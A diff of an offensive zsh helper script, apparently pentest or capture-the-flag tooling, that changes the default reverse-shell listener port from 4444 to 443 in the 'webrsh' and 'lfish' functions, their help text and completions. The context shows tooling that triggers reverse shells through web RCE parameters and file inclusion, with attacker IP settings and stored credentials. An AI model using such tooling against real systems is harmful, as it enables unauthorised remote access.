@@ -192,7 +192,7 @@ lhost() {
 
 _webrsh-trigger() {
   local target="$1"
-  local port="${2:-4444}"
+  local port="${2:-443}"
   local param="${3:-$(_webrsh-param-default)}"
   local method="${(U)${4:-$(_webrsh-method-default)}}"
   local auth_spec="${5:-}"
@@ -233,7 +233,7 @@ _webrsh-trigger() {
 webrsh() {
   local param="$(_webrsh-param-default)"
   local method="$(_webrsh-method-default)"
-  local target_spec="" target="" listen_port="4444" auth_spec=""
+  local target_spec="" target="" listen_port="443" auth_spec=""
 
   (( $+functions[target-load] )) && [[ -z "${IP:-}" ]] && target-load 2>/dev/null
 
@@ -249,7 +249,7 @@ webrsh() {
         echo "  -X, --method METHOD   GET (default) or POST (or \$WEBRSH_METHOD)"
         echo "  --post                shortcut for -X POST"
         echo "  -p, --param NAME      RCE parameter (default: cmd, or \$WEBRSH_PARAM)"
-        echo "  -P, --listen-port N   revshell listener port (default: 4444)"
+        echo "  -P, --listen-port N   revshell listener port (default: 443)"
         echo "  -u, --user USER[:PASS]  HTTP Basic Auth (PASS from creds-list if omitted)"
         echo "                          or \$WEBRSH_AUTH / \$WEBRSH_USER+\$WEBRSH_PASS"
         echo ""
@@ -312,7 +312,7 @@ lfish() {
   local param=""
   local method="GET"
   local shell_type="proc"
-  local target_spec="" target="" listen_port="4444" lhost="" auth_spec=""
+  local target_spec="" target="" listen_port="443" lhost="" auth_spec=""
   local chain enc
 
   (( $+functions[target-load] )) && [[ -z "${IP:-}" ]] && target-load 2>/dev/null
@@ -331,7 +331,7 @@ lfish() {
         echo "  --post                  shortcut for -X POST"
         echo "  -t, --type TYPE         shell type: proc (default), bash, nc"
         echo "  -l, --lhost IP          attacker IP (default: lhost)"
-        echo "  -P, --lport N           reverse shell port (default: 4444)"
+        echo "  -P, --lport N           reverse shell port (default: 443)"
         echo "  -u, --user USER[:PASS]  HTTP Basic Auth (PASS from creds-list if omitted)"
         echo ""
         echo "examples:"
@@ -446,7 +446,7 @@ _webrsh() {
     '-X[HTTP method]:method:(GET POST)' \
     '--post[use POST]' \
     '-p[RCE parameter name]:param name:(cmd command)' \
-    '-P[revshell listener port]:port:(4444 5555 6666)' \
+    '-P[revshell listener port]:port:(443 5555 6666)' \
     '-u[HTTP Basic user or user:pass]:user:' \
     '1:path or url:(/home.php home.php :8080/home.php)' \
     '*:path or url:(/home.php home.php :8080/home.php)'
@@ -461,7 +461,7 @@ _lfish() {
     '--post[use POST]' \
     '-t[shell type]:type:(proc bash nc)' \
     '-l[attacker IP]:ip:_hosts' \
-    '-P[reverse shell port]:port:(4444 5555 6666)' \
+    '-P[reverse shell port]:port:(443 5555 6666)' \
     '-u[HTTP Basic user or user:pass]:user:' \
     '1:path or url:(/secret-script.php secret-script.php :8080/include.php)' \
     '*:path or url:(/secret-script.php secret-script.php :8080/include.php)'
